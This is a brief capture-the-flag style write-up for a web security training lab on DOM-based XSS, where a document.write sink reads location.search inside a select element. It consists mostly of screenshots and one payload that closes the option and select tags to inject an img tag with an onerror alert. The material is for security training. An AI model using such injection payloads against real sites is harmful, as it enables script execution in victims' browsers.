# Lab: DOM XSS in document.write sink using source location.search inside a select element

URL: https://0a8900b2047c9f6180d726de006000be.web-security-academy.net/

![](./Images/img1.png)

URL: https://0a8900b2047c9f6180d726de006000be.web-security-academy.net/product?productId=4

![](./Images/img2.png)

![](./Images/img3.png)

![](./Images/img4.png)

# Exploitation:

![](./Images/img5.png)

<br>

We have to escape the `option` and `select` tags.

Payload:

```
test</option></select><img src=x onerror=alert("XSS")>;
```

![](./Images/img6.png)